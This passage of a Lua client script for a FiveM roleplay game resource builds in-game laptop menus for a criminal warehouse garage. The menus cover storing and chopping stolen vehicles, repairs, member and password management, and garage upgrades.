					header = Config.LangT["Vehicle:"]..v.car,
					txt = Config.LangT["BodyHealth"]..v.health..Config.LangT["Plate:"]..v.plate,
					icon = "fas fa-car",
					params = {
						event = "Pug:Client:TakeVehicleToDropOffMenu",
						args = v
					}
				}
			end
		end
		LaptopMenu[#LaptopMenu+1] = {
			header = Config.LangT["Back"],
			params = {
				event = "Pug:Client:OpenCrimGarageLaptopMenu",
				args = 'yuh',
			}
		}
		exports[Config.Menu]:openMenu(LaptopMenu)
	end
end)

RegisterNetEvent("Pug:Client:TakeVehicleToDropOffMenu", function(data)
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title = data.car,
				event = "Pug:Client:OpenCrimGarageChoppingMenu",
			},
		}
		if data.health >= 1000 then
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["DoDropOff"]..data.car,
				icon = "fas fa-car",
				serverEvent = "Pug:Server:TakeVehicleToDropOff",
				args = {
					info = data,
				}
			}
		else
			local cost = round(1000 - data.health)
			local RepairPrice = round(cost * Config.VehicleRepairMultiplier)
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["Repair"]..data.car.. Config.LangT["ForMoney"].. RepairPrice,
				icon = "fas fa-car",
				serverEvent = "Pug:Server:RepairStoredVehicle",
				args = {
					info = data,
					price = RepairPrice,
				}
			}
		end
		LaptopMenu[#LaptopMenu+1] = {
			title = Config.LangT["Back"],
			event = "Pug:Client:OpenCrimGarageChoppingMenu",
		}
		lib.registerContext({
			id = 'TakeVehicleToDropOffMenu',
			title = Config.LangT["DoDropOff"],
			options = LaptopMenu
		})
		lib.showContext('TakeVehicleToDropOffMenu')
	else
		local LaptopMenu = {
			{
				header = data.car,
				params = {
					event = "Pug:Client:OpenCrimGarageChoppingMenu",
				}
			},
		}
		if data.health >= 1000 then
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["DoDropOff"]..data.car,
				icon = "fas fa-car",
				params = {
					isServer = true,
					event = "Pug:Server:TakeVehicleToDropOff",
					args = {
						info = data,
					}
				}
			}
		else
			local cost = round(1000 - data.health)
			local RepairPrice = round(cost * Config.VehicleRepairMultiplier)
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["Repair"]..data.car.. Config.LangT["ForMoney"].. RepairPrice,
				icon = "fas fa-car",
				params = {
					isServer = true,
					event = "Pug:Server:RepairStoredVehicle",
					args = {
						info = data,
						price = RepairPrice,
					}
				}
			}
		end
		LaptopMenu[#LaptopMenu+1] = {
			header = Config.LangT["Back"],
			params = {
				event = "Pug:Client:OpenCrimGarageChoppingMenu",
			}
		}
		exports[Config.Menu]:openMenu(LaptopMenu)
	end
end)

RegisterNetEvent("Pug:Client:OpenCrimGarageLaptopMenu", function(bool)
	if bool == 'yuh' then
	else
		TriggerEvent('InteractSound_CL:PlayOnOne', "windows", 0.02)
		TaskGoStraightToCoord(PlayerPedId(), vector3(964.42, -3003.49, -39.64), 1.0, -1, 0.0, 0.0)
		while #(GetEntityCoords(PlayerPedId()) - vector3(964.42, -3003.49, -39.64)) > 0.2 do Wait(100) end
		ClearPedTasksImmediately(PlayerPedId())
		TaskTurnPedToFaceCoord(PlayerPedId(), vector3(962.17, -3003.55, -39.6), 1500)
		Wait(800)
		loadAnimDict("anim@heists@prison_heistig1_p1_guard_checks_bus")
		TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistig1_p1_guard_checks_bus", "loop", 2.0, 2.0, 7000, 1, 0, false, false, false)
	end
	local count = 0
	if CurrentGarage.carsstored ~= nil then
		for k, _ in pairs(json.decode(CurrentGarage.carsstored)) do
			count = count + 1
		end
	end
	ViewingUpgrade = false
	if CurrentGarage then
		if Config.Menu == "ox_lib" then
			local LaptopMenu = {
				{
					title = Config.LangT["WarehouseGarageHub"],
					description = CurrentGarage.cars..Config.LangT["CarsObtained"]..", "..count..Config.LangT["CarsActivelyStored"],
					icon = "fa-solid fa-house",
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					args = 'yuh',
				},
				{
					title = Config.LangT["VehiclesMenu"],
					description = Config.LangT["ManageAllVehicles"],
					icon = "fas fa-car",
					event = "Pug:Client:OpenCrimGarageChoppingMenu",
				},
				{
					title = Config.LangT["ManageWarehouse"],
					description = Config.LangT["ManageWeahouseFeatures"],
					icon = "fa-solid fa-boxes-stacked",
					event = "Pug:Client:ManagewarehouseGarageMenu",
				},
			}
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["Close"],
				event = "Pug:client:ClearPedTasksImmediately",
			}
			lib.registerContext({
				id = 'WarehouseGarageHub',
				title = Config.LangT["WarehouseGarageHub"],
				options = LaptopMenu
			})
			lib.showContext('WarehouseGarageHub')
		else
			local LaptopMenu = {
				{
					header = Config.LangT["WarehouseGarageHub"],
					txt = CurrentGarage.cars..Config.LangT["CarsObtained"]..", "..count..Config.LangT["CarsActivelyStored"],
					icon = "fa-solid fa-house",
					params = {
						event = "Pug:Client:OpenCrimGarageLaptopMenu",
						args = 'yuh',
					}
				},
				{
					header = Config.LangT["VehiclesMenu"],
					txt = Config.LangT["ManageAllVehicles"],
					icon = "fas fa-car",
					params = {
						event = "Pug:Client:OpenCrimGarageChoppingMenu",
					}
				},
				{
					header = Config.LangT["ManageWarehouse"],
					txt = Config.LangT["ManageWeahouseFeatures"],
					icon = "fa-solid fa-boxes-stacked",
					params = {
						event = "Pug:Client:ManagewarehouseGarageMenu",
					}
				},
			}
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["Close"],
				params = {
					event = "Pug:client:ClearPedTasksImmediately",
					args = {"c"},
				}
			}
			exports[Config.Menu]:openMenu(LaptopMenu)
		end
	else
		ChoppingNotify(Config.LangT["ShouldntBeHere"], "error", 4500)
	end
end)
RegisterNetEvent("Pug:client:ClearPedTasksImmediately", function()
	ClearPedTasksImmediately(PlayerPedId())
end)

RegisterNetEvent("Pug:Client:ManagewarehouseGarageMenu", function()
	local count = 0
	if CurrentGarage.carsstored ~= nil then
		for k, _ in pairs(json.decode(CurrentGarage.carsstored)) do
			count = count + 1
		end
	end
	ViewingUpgrade = false
	DeleteTestPreviews()
	DestoryCamera()
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title = Config.LangT["WarehouseGarageHub"],
				description = CurrentGarage.cars..Config.LangT["CarsObtained"]..", "..count..Config.LangT["CarsActivelyStored"],
				icon = "fa-solid fa-house",
				event = "Pug:Client:OpenCrimGarageLaptopMenu",
				args = 'yuh',
			},
			{
				title = Config.LangT["ChangePassword"],
				icon = "fa-solid fa-lock",
				event = "Pug:client:ChangeGaragePassword",
			},
			{
				title = Config.LangT["ManageMembers"],
				icon = "fa-solid fa-user-check",
				event = "Pug:client:ManageMembersMenu",
			},
			{
				title = Config.LangT["UpgradeGarage"],
				icon = "fa-solid fa-wrench",
				event = "Pug:client:UpgradewarehouseGarage",
			},
			{
				title = Config.LangT["UpgradeVehicleSlots"]..CurrentGarage.vehiclecap.."/"..#Config.CarSpawnLocations,
				icon = "fa-solid fa-clipboard",
				event = "Pug:client:UpgradeVehicleSlots",
			},
		}
		LaptopMenu[#LaptopMenu+1] = {
			title = Config.LangT["Back"],
			event = "Pug:Client:OpenCrimGarageLaptopMenu",
			args = 'yuh',
		}
		lib.registerContext({
			id = 'WarehouseGarageHub',
			title = Config.LangT["WarehouseGarageHub"],
			options = LaptopMenu
		})
		lib.showContext('WarehouseGarageHub')
	else
		local LaptopMenu = {
			{
				header = Config.LangT["WarehouseGarageHub"],
				txt = CurrentGarage.cars..Config.LangT["CarsObtained"]..", "..count..Config.LangT["CarsActivelyStored"],
				icon = "fa-solid fa-house",
				params = {
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					args = 'yuh',
				}
			},
			{
				header = Config.LangT["ChangePassword"],
				icon = "fa-solid fa-lock",
				params = {
					event = "Pug:client:ChangeGaragePassword",
				}
			},
			{
				header = Config.LangT["ManageMembers"],
				icon = "fa-solid fa-user-check",
				params = {
					event = "Pug:client:ManageMembersMenu",
				}
			},
			{
				header = Config.LangT["UpgradeGarage"],
				icon = "fa-solid fa-wrench",
				params = {
					event = "Pug:client:UpgradewarehouseGarage",
				}
			},
			{
				header = Config.LangT["UpgradeVehicleSlots"]..CurrentGarage.vehiclecap.."/"..#Config.CarSpawnLocations,
				icon = "fa-solid fa-clipboard",
				params = {
					event = "Pug:client:UpgradeVehicleSlots",
				}
			},
		}
		LaptopMenu[#LaptopMenu+1] = {
			header = Config.LangT["Back"],
			params = {
				event = "Pug:Client:OpenCrimGarageLaptopMenu",
				args = 'yuh',
			}
		}
		exports[Config.Menu]:openMenu(LaptopMenu)
	end
end)

RegisterNetEvent("Pug:client:UpgradeVehicleSlots", function()
	local Price = Config.VehicleCapUpgradePrice * tonumber(CurrentGarage.vehiclecap)
	local UpgradeText = '+'..Config.IncreaseVehicleAmount..Config.LangT["ForMoney"]..Price
	if CurrentGarage.vehiclecap >= #Config.CarSpawnLocations then
		UpgradeText = Config.LangT["MaxedOut"]
	end
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title =  Config.LangT["UpgradeVehicleSlots"]..CurrentGarage.vehiclecap.."/"..#Config.CarSpawnLocations,
				event = "Pug:Client:ManagewarehouseGarageMenu",
			},
			{
				title = Config.LangT["UpgradeVehicleSlots"]..CurrentGarage.vehiclecap.."/"..#Config.CarSpawnLocations,
				description = UpgradeText,
				icon = "fa-solid fa-clipboard",
				serverEvent = "Pug:Server:UpgradeVehicleSlots",
				args = {
					cost = Price,
				}
			},
		}
		LaptopMenu[#LaptopMenu+1] = {
			title = Config.LangT["Back"],
			event = "Pug:Client:ManagewarehouseGarageMenu",
		}
		lib.registerContext({
			id = 'UpgradeVehicleSlots',
			title = Config.LangT["UpgradeVehicleSlots"],
			options = LaptopMenu
		})
		lib.showContext('UpgradeVehicleSlots')
	else
		local LaptopMenu = {
			{
				header =  Config.LangT["UpgradeVehicleSlots"]..CurrentGarage.vehiclecap.."/"..#Config.CarSpawnLocations,
				params = {
					event = "Pug:Client:ManagewarehouseGarageMenu",
				}
			},
			{
				header = Config.LangT["UpgradeVehicleSlots"]..CurrentGarage.vehiclecap.."/"..#Config.CarSpawnLocations,
				txt = UpgradeText,
				icon = "fa-solid fa-clipboard",
				params = {
					isServer = true,
					event = "Pug:Server:UpgradeVehicleSlots",
					args = {
						cost = Price,
					}
				}
			},
		}
		LaptopMenu[#LaptopMenu+1] = {
			header = Config.LangT["Back"],
			params = {
				event = "Pug:Client:ManagewarehouseGarageMenu",
			}
		}
		exports[Config.Menu]:openMenu(LaptopMenu)
	end
end)


RegisterNetEvent("Pug:client:ManageMembersMenu", function()
	local MemberCount = 0
	for _, _ in pairs(json.decode(CurrentGarage.access)) do
		MemberCount = MemberCount + 1
	end
	local Price = Config.MembersUpgradePrice * tonumber(CurrentGarage.membercap)
	local UpgradeText = Config.LangT["+1For"]..Price
	if CurrentGarage.membercap >= Config.MaximumMembers then
		UpgradeText = Config.LangT["MaxedOut"]
	end
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title = Config.LangT["ManageWarehouse"],
				event = "Pug:Client:ManagewarehouseGarageMenu",
			},
			{
				title = Config.LangT["AddAMember"],
				description = Config.LangT["CurrentCapacity"]..MemberCount..'/'..tonumber(CurrentGarage.membercap) .. ' | Max ('..Config.MaximumMembers..')',
				icon = "fa-solid fa-users",
				event = "Pug:client:AddAGarageMember",
			},
			{
				title = Config.LangT["UpgradeMemberSlots"],
				description = UpgradeText,
				icon = "fa-solid fa-user-plus",
				serverEvent = "Pug:Server:UpgradeMemberSlots",
				args = {
					cost = Price,
					count = MemberCount,
				}
			},
		}
		Config.FrameworkFunctions.TriggerCallback("Pug:serverCB:GetGaragePlayerNames", function(data)
			if data ~= nil then
				for k, v in pairs(data) do
					LaptopMenu[#LaptopMenu+1] = {
						title = v.name,
						icon = "fas fa-user-secret",
						description = Config.LangT["KickMember"]..Config.KickMemberPrice..')' ,
						event = "Pug:Client:RemovewarehouseMemmber",
						args = {
							name = v.name,
							cid = v.cid,
						}
					}
				end
			end
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["Back"],
				event = "Pug:Client:ManagewarehouseGarageMenu",
			}
			lib.registerContext({
				id = 'ManageWarehouse',
				title = Config.LangT["ManageWarehouse"],
				options = LaptopMenu
			})
			lib.showContext('ManageWarehouse')
		end)
	else
		local LaptopMenu = {
			{
				header = Config.LangT["ManageWarehouse"],
				params = {
					event = "Pug:Client:ManagewarehouseGarageMenu",
				}
			},
			{
				header = Config.LangT["AddAMember"],
				txt = Config.LangT["CurrentCapacity"]..MemberCount..'/'..tonumber(CurrentGarage.membercap) .. ' | Max ('..Config.MaximumMembers..')',
				icon = "fa-solid fa-users",
				params = {
					event = "Pug:client:AddAGarageMember",
				}
			},
			{
				header = Config.LangT["UpgradeMemberSlots"],
				txt = UpgradeText,
				icon = "fa-solid fa-user-plus",
				params = {
					isServer = true,
					event = "Pug:Server:UpgradeMemberSlots",
					args = {
						cost = Price,
						count = MemberCount,
					}
				}
			},
		}
		Config.FrameworkFunctions.TriggerCallback("Pug:serverCB:GetGaragePlayerNames", function(data)
			if data ~= nil then
				for k, v in pairs(data) do
					LaptopMenu[#LaptopMenu+1] = {
						header = v.name,
						icon = "fas fa-user-secret",
						txt = Config.LangT["KickMember"]..Config.KickMemberPrice..')' ,
						params = {
							event = "Pug:Client:RemovewarehouseMemmber",
							args = {
								name = v.name,
								cid = v.cid,
							}
						}
					}
				end
			end
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["Back"],
				params = {
					event = "Pug:Client:ManagewarehouseGarageMenu",
				}
			}
			exports[Config.Menu]:openMenu(LaptopMenu)
		end)
	end
end)

RegisterNetEvent("Pug:Client:RemovewarehouseMemmber", function(data)
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title = Config.LangT["AreYouSureYouWantToRemove"].. data.name..Config.LangT["ForMoney"]..Config.KickMemberPrice ..'?',
				event = "Pug:client:ManageMembersMenu",
			},
			{
				title = Config.LangT["Yes"],
				icon = "fas fa-user-secret",
				serverEvent = "Pug:Server:RemovewarehouseMemmber",
				args = data
			},
			{
				title =  Config.LangT["No"],
				icon = "fas fa-user-secret",
				event = "Pug:client:ManageMembersMenu",
			},
		}
		lib.registerContext({
			id = 'AreYouSureYouWantToRemove',
			title = Config.LangT["AreYouSureYouWantToRemove"],
			options = LaptopMenu
		})
		lib.showContext('AreYouSureYouWantToRemove')
	else
		local LaptopMenu = {
			{
				header = Config.LangT["AreYouSureYouWantToRemove"].. data.name..Config.LangT["ForMoney"]..Config.KickMemberPrice ..'?',
				params = {
					event = "Pug:client:ManageMembersMenu",
				}
			},
			{
				header = Config.LangT["Yes"],
				icon = "fas fa-user-secret",
				params = {
					isServer = true,
					event = "Pug:Server:RemovewarehouseMemmber",
					args = data
				}
			},
			{
				header =  Config.LangT["No"],
				icon = "fas fa-user-secret",
				params = {
					event = "Pug:client:ManageMembersMenu",
				}
			},
		}
		exports[Config.Menu]:openMenu(LaptopMenu)
	end
end)


RegisterNetEvent("Pug:client:AddAGarageMember", function()
	local MemberCount = 0
	for k, _ in pairs(json.decode(CurrentGarage.access)) do
		MemberCount = MemberCount + 1
	end
	if tonumber(CurrentGarage.membercap) > tonumber(MemberCount) then
		if Config.InputScript == "qb-input" or Config.InputScript == "ps-ui" then
			if Config.InputScript == "ps-ui" then
				local input = exports[Config.InputScript]:Input({
					header = 'Add Member',
					submitText = "Member",
					inputs = {
						{
							type = 'number',
							isRequired = true,
							name = 'id',
							text = '(PLAYERS ID)'
						}
					}
				})
				if not input then 
					ChoppingNotify(Config.LangT["NoID"], 'error')
					TriggerEvent("Pug:client:ManageMembersMenu")
					return
				end
				if input.id then
					TriggerServerEvent("Pug:server:AddMemberToGarage", tonumber(input.id), MemberCount)
				end
			else
				local input = exports[Config.InputScript]:ShowInput({
					header = 'Add Member',
					submitText = "Member",
					inputs = {
						{
							type = 'number',
							isRequired = true,
							name = 'id',
							text = '(PLAYERS ID)'
						}
					}
				})
				if not input then 
					ChoppingNotify(Config.LangT["NoID"], 'error')
					TriggerEvent("Pug:client:ManageMembersMenu")
					return
				end
				if input.id then
					TriggerServerEvent("Pug:server:AddMemberToGarage", tonumber(input.id), MemberCount)
				end
			end
		else
			local input = lib.inputDialog(Config.LangT["AddAMember"], {
				{
					type = 'number',
					name = "id",
					label = Config.LangT["PlayerId"]
				}
			})
			if not input then 
				ChoppingNotify(Config.LangT["NoID"], 'error')
				TriggerEvent("Pug:client:ManageMembersMenu")
				return
			end
			if input[1] then
				TriggerServerEvent("Pug:server:AddMemberToGarage", tonumber(input[1]), MemberCount)
			end
		end
	else
		ChoppingNotify(Config.LangT["MaxMembers"]..tonumber(MemberCount), 'error')
		TriggerEvent("Pug:client:ManageMembersMenu")
	end
end)

RegisterNetEvent("Testinggg", function()
	print("TestingggTestingggTestinggg")
end)

RegisterNetEvent("Pug:client:EnterGaragePassword", function()
	if Config.InputScript == "qb-input" or Config.InputScript == "ps-ui" then
		if Config.InputScript == "ps-ui" then
			local input = exports[Config.InputScript]:Input({
				header = Config.LangT["EnterPassword"],
				submitText = "Password",
				inputs = {
					{
						type = 'number',
						isRequired = true,
						name = 'id',
						text = Config.LangT["PASSWORD"]
					}
				}
			})
			if not input then 
				ChoppingNotify(Config.LangT["NoPassword"], 'error')
				TriggerEvent("Pug:Client:CriminalGarageMenu")
				return
			end
			if input.id then
				TriggerServerEvent("Pug:server:EnterGaragePassword", tonumber(input.id))
			end
		else
			local input = exports[Config.InputScript]:ShowInput({
				header = Config.LangT["EnterPassword"],
				submitText = "Password",
				inputs = {
					{
						type = 'number',
						isRequired = true,
						name = 'id',
						text = Config.LangT["PASSWORD"]
					}
				}
			})
			if not input then 
				ChoppingNotify(Config.LangT["NoPassword"], 'error')
				TriggerEvent("Pug:Client:CriminalGarageMenu")
				return
			end
			if input.id then
				TriggerServerEvent("Pug:server:EnterGaragePassword", tonumber(input.id))
			end
		end
	else
		local input = lib.inputDialog(Config.LangT["EnterPassword"], {
			{
				type = 'number',
				name = "id",
				label = Config.LangT["PASSWORD"]
			}
		})
		if not input then 
			ChoppingNotify(Config.LangT["NoPassword"], 'error')
			TriggerEvent("Pug:Client:CriminalGarageMenu")
			return
		end
		if input[1] then
			TriggerServerEvent("Pug:server:EnterGaragePassword", tonumber(input[1]))
		end
	end
end)

RegisterNetEvent("Pug:client:ChangeGaragePassword", function()
	if Config.InputScript == "qb-input" or Config.InputScript == "ps-ui" then
		if Config.InputScript == "ps-ui" then
			local input = exports[Config.InputScript]:Input({
				header = Config.LangT["ChangePassword"],
				submitText = "Password",
				inputs = {
					{
						type = 'number',
						isRequired = true,
						name = 'id',
						text = '(CURRENT IS '.. tonumber(CurrentGarage.password) ..')'
					}
				}
			})
			if not input then 
				ChoppingNotify(Config.LangT["NoPassword"], 'error')
				Wait(200)
				TriggerEvent("Pug:Client:ManagewarehouseGarageMenu")
				return
			end
			if input.id then
				TriggerServerEvent("Pug:server:ChangeGaragePassword", tonumber(input.id))
			end
		else
			local input = exports[Config.InputScript]:ShowInput({
				header = Config.LangT["ChangePassword"],
				submitText = "Password",
				inputs = {
					{
						type = 'number',
						isRequired = true,
						name = 'id',
						text = '(CURRENT IS '.. tonumber(CurrentGarage.password) ..')'
					}
				}
			})
			if not input then 
				ChoppingNotify(Config.LangT["NoPassword"], 'error')
				Wait(200)
				TriggerEvent("Pug:Client:ManagewarehouseGarageMenu")
				return
			end
			if input.id then
				TriggerServerEvent("Pug:server:ChangeGaragePassword", tonumber(input.id))
			end
		end
	else
		local input = lib.inputDialog(Config.LangT["ChangePassword"], {
			{
				type = 'number',
				name = "id",
				label = '(CURRENT IS '.. tonumber(CurrentGarage.password) ..')'
			}
		})
		if not input then 
			ChoppingNotify(Config.LangT["NoPassword"], 'error')
			Wait(200)
			TriggerEvent("Pug:Client:ManagewarehouseGarageMenu")
			return
		end
		if input[1] then
			TriggerServerEvent("Pug:server:ChangeGaragePassword", tonumber(input[1]))
		end
	end
end)


RegisterNetEvent("Pug:client:UpgradewarehouseGarage", function(info)
	if not ViewingUpgrade then
		ViewingUpgrade = true
		TriggerEvent("Pug:FixCameraLoopWhileViewingUpgrade")
	end
	local DontShowMenu = false
	local Header = Config.LangT["Upgrade"]..Config.UpgradesMenu[1].label
	local text = '$'..Config.UpgradesMenu[1].price .. ' & '.. Config.UpgradesMenu[1].CarsCount .. Config.LangT["CarsObtained"]..' & '.. Config.UpgradesMenu[1].Carsowned ..Config.LangT["CarsInTheGarage"]
	DeleteTestPreviews()
	if info then
		Header = Config.LangT["Upgrade"]..Config.UpgradesMenu[info].label
		text = '$'..Config.UpgradesMenu[info].price .. ' & '.. Config.UpgradesMenu[info].CarsCount .. Config.LangT["CarsObtained"]..' & '.. Config.UpgradesMenu[info].Carsowned ..Config.LangT["CarsInTheGarage"]
		CreateTestPreviews(info)
		DestoryCamera()
		CreateCamera(Config.UpgradesMenu[info].CamPos, Config.UpgradesMenu[info].CamRot, true)-- creates camera pos and rotation
	else
		DestoryCamera()
		CreateCamera(Config.UpgradesMenu[1].CamPos, Config.UpgradesMenu[1].CamRot, true)-- creates camera pos and rotation
	end
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title = Header,
				description = text,
				icon = "fa-solid fa-clipboard",
				serverEvent = "Pug:server:UpgradewarehouseGarage",
				args = info or 1
			},
		}
		for k, v in pairs(Config.UpgradesMenu) do
			if CurrentGarage.upgrades ~= nil then
				for _, j in pairs(json.decode(CurrentGarage.upgrades)) do
					if j == v.itemupgrade then
						DontShowMenu = true
						break
					else
						-- if tonumber(CurrentGarage.cars) >= v.CarsCount then
							DontShowMenu = false
						-- else
							-- DontShowMenu = true
							-- break
						-- end
					end
				end
			end
			LaptopMenu[#LaptopMenu+1] = {
				title = v.label,
				disabled = DontShowMenu,
				icon = "fas fa-user-secret",
				event = "Pug:client:UpgradewarehouseGarage",
				args = k
			}
		end
		LaptopMenu[#LaptopMenu+1] = {
			title = Config.LangT["Back"],
			event = "Pug:Client:ManagewarehouseGarageMenu",
		}
		lib.registerContext({
			id = 'UpgradewarehouseGarage',
			title = Header,
			options = LaptopMenu
		})
		lib.showContext('UpgradewarehouseGarage')
	else
		local LaptopMenu = {
			{
				header = Header,
				txt = text,
				icon = "fa-solid fa-clipboard",
				params = {
					isServer = true,
					event = "Pug:server:UpgradewarehouseGarage",
					args = info or 1
				}
			},
		}
		for k, v in pairs(Config.UpgradesMenu) do
			if CurrentGarage.upgrades ~= nil then
				for _, j in pairs(json.decode(CurrentGarage.upgrades)) do
					if j == v.itemupgrade then
						DontShowMenu = true
						break
					else
						-- if tonumber(CurrentGarage.cars) >= v.CarsCount then
							DontShowMenu = false
						-- else
							-- DontShowMenu = true
							-- break
						-- end
					end
				end
			end
			LaptopMenu[#LaptopMenu+1] = {
				header = v.label,
				disabled = DontShowMenu,
				icon = "fas fa-user-secret",
				params = {
					event = "Pug:client:UpgradewarehouseGarage",
					args = k
				}
			}
		end
		LaptopMenu[#LaptopMenu+1] = {
			header = Config.LangT["Back"],
			params = {
				event = "Pug:Client:ManagewarehouseGarageMenu",
			}
		}
		exports[Config.Menu]:openMenu(LaptopMenu)
	end
end)

RegisterNetEvent("Pug:client:UpdateInsideGarageData", function(data)
	if CurrentGarage then
		CurrentGarage = data
	end
end)

RegisterNetEvent("Pug:Client:CutScene", function(RouteBucket)
	for k, v in pairs(Config.GarageZones) do
		if #(GetEntityCoords(PlayerPedId()) - Config.GarageZones[k]['Zone']['cameracoords']) <= 80.0 then
			GarageCoods = Config.GarageZones[k]
			break
		end
	end
	if Config.DoCutSceneWehnPurchase then
		DoCutScene(RouteBucket)
		StartCutscene(0)
		Wait(1000)
		DoScreenFadeIn(1000)
		while not (HasCutsceneFinished()) do
			Wait(0)
		end   
		DoScreenFadeOut(500)
		Wait(3000)
	end
	-- CreateLaptopBoxZone()
	TriggerEvent("CreateLaptopBoxZoneEvent")
	InsideGarage = true
	SetEntityVisible(PlayerPedId(),true)
	Config.FrameworkFunctions.TriggerCallback('Pug:server:HasCrimGarageCB', function(result)
        if result then
			local data = {
				toggle = true,
				info = result,
			}
			TriggerEvent("Pug:Client:EnterCriminalGarage", data)
		end
	end)
	local Ped = PlayerPedId()
	DoScreenFadeIn(1000)
	Wait(200)
end)

RegisterNetEvent("Pug:FixCameraLoopWhileViewingUpgrade", function()
	while true do
		Wait(5)
		if ViewingUpgrade then
			if IsControlJustPressed(1, 51) or IsControlJustPressed(1, 177) then
				ViewingUpgrade = false
				DeleteTestPreviews()
				DestoryCamera()
				break
			end
		else
			ViewingUpgrade = false
			DeleteTestPreviews()
			DestoryCamera()
			break
		end
	end
end)

function GetGarageLocation()
	return GarageCoods['Zone']['location']
end
RegisterNetEvent("Pug:Client:StoreStolenCarInGarage", function(data)
	CurrentGarage = data.info
	local Ped = PlayerPedId()
	for k, v in pairs(Config.GarageZones) do
		if #(GetEntityCoords(PlayerPedId()) - Config.GarageZones[k]['Zone']['cameracoords']) <= 80.0 then
			GarageCoods = Config.GarageZones[k]
			break
		end
	end
	DoScreenFadeOut(500)
    while not IsScreenFadedOut() do Wait(100) end
	local Vehicle = GetVehiclePedIsIn(PlayerPedId())
	-- CreateLaptopBoxZone()
	TriggerEvent("CreateLaptopBoxZoneEvent")
	InsideGarage = true
	StartPlayerTeleport(PlayerId(), 970.77, -2990.27, -39.35, 185.06, true, true, true)
	while IsPlayerTeleportActive() do Wait(100) end
	for k, v in pairs(Config.UpgradesMenu) do
		if CurrentGarage.upgrades ~= nil then
			for _, j in pairs(json.decode(CurrentGarage.upgrades)) do
				if j == v.itemupgrade then
					TriggerEvent(Config.UpgradesMenu[k].AddUpgradeEvent)
					break
				end
			end
		end
	end
	Wait(3000)
	-- SpawnStoedVehicles() 
	TriggerEvent("SpawnStoredVehiclesEvent")
	DoScreenFadeIn(1000)
	Wait(1000)
	TaskLeaveVehicle(PlayerPedId(), Vehicle, 1)
	Wait(1500)
	if GetResourceState("AdvancedParking") == 'started' then
		exports["AdvancedParking"]:DeleteVehicle(Vehicle)
	else
		TriggerEvent("FullyDeleteChoppingVehicle", Vehicle)
	end
end)

RegisterNetEvent("Pug:client:AddNewVehicleToGarage", function()
	Wait(2000)
	if CurrentGarage ~= nil then
		if CurrentGarage.carsstored ~= nil then
			local count = 0
			for k, _ in pairs(json.decode(CurrentGarage.carsstored)) do
				count = count + 1
			end
			Wait(100)
			for k, v in pairs(json.decode(CurrentGarage.carsstored)) do
				if k == count then
					local coords = Config.CarSpawnLocations[k]
					local model = GetHashKey(v.car)
					RequestModel(model)
					while not HasModelLoaded(model) do
						Wait(50)
					end
					local veh = CreateVehicle(model, coords.x, coords.y, coords.z-0.3)
					while not DoesEntityExist(veh) do
						Wait(50)
					end
					SetModelAsNoLongerNeeded(model)
					SetVehicleOnGroundProperly(veh)
					SetEntityInvincible(veh, true)
					SetEntityHeading(veh, coords.w)
					-- SetVehicleDoorsLocked(veh, 3)
					FreezeEntityPosition(veh, true)
					-- SetVehicleNumberPlateText(veh, 'BUY ME')
				end
			end
		end
	end
end)

RegisterNetEvent("Pug:client:UpdateChopTracker", function(coords,model,plate)
    local TrackerBlip = AddBlipForCoord(coords.x, coords.y, coords.z)
    SetBlipSprite(TrackerBlip, 161)
    SetBlipColour(TrackerBlip, 1)
    SetBlipScale(TrackerBlip, 1.00)
    AddTextEntry('TrackerBlipText', "Vehicle Theft "..model.." - "..plate)
    BeginTextCommandSetBlipName('MYBLIP')
    AddTextComponentSubstringPlayerName("Vehicle Theft "..model.." - "..plate)
    EndTextCommandSetBlipName(TrackerBlip)
    Wait(10*1000) -- How long the blip should remain active, here 10 seconds
    RemoveBlip(TrackerBlip)
end)

RegisterNetEvent("Pug:Client:StartChoppingVehicleRun", function(car, loc, Plate)
	DoScreenFadeOut(500)
	while not IsScreenFadedOut() do Wait(100) end
	local coords = GetGarageLocation()
	TriggerEvent("Pug:client:GotInStoredVehicleTimeToScrap", Plate)
	local data = {
		toggle = false,
	}
	TriggerEvent("Pug:Client:EnterCriminalGarage", data)
	Wait(900)
	PugSpawnVehicle(car, function(veh)
		SetEntityHeading(veh, coords.w)
		SetVehicleEngineOn(veh, false, false)
		SetVehicleOnGroundProperly(veh)
		SetVehicleNeedsToBeHotwired(veh, false)
		SetVehicleColours(vehicle, 0, 0)
		SetVehicleNumberPlateText(veh, Plate)
		SetVehicleFuelLevel(veh, 100.0)
		TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
		SetVehicleDoorsLocked(veh, 0)
		TriggerEvent(Config.VehilceKeysGivenToPlayerEvent, GetPlate(veh))
	end, coords, true)
	Wait(700)
	DoScreenFadeIn(500)
end)

RegisterNetEvent("Pug:client:DeleteRemovedCarFromShop", function(plt)
	if CurrentGarage ~= nil then
		for _, v in pairs(GetGamePool('CVehicle')) do
			local Plate = GetPlate(v)
			if Plate == plt then
				if GetResourceState("AdvancedParking") == 'started' then
					exports["AdvancedParking"]:DeleteVehicle(v)
				else
					TriggerEvent("FullyDeleteChoppingVehicle", v)
				end
			end
		end
	end
end)
function GetIdentifiers(source, idtype)
	local identifiers = GetPlayerIdentifiers(source)
	for _, identifier in pairs(identifiers) do
		if string.find(identifier, idtype) then
			return identifier
		end
	end
	return nil
end

RegisterNetEvent('Pug:client:ChopPartsDown', function()
	if Config.Menu == "ox_lib" then
		local menu = {
			{
				title = Config.LangT["BreakDownParts"],
				icon = 'fas fa-clipboard',
				description = ""
			},
			{
				title = Config.LangT["BreakDownDoors"],
				description = "1x Part",
				icon = "fa-solid fa-door-open",
				event = "Pug:client:ChopDownVehiclePart",
				args = {
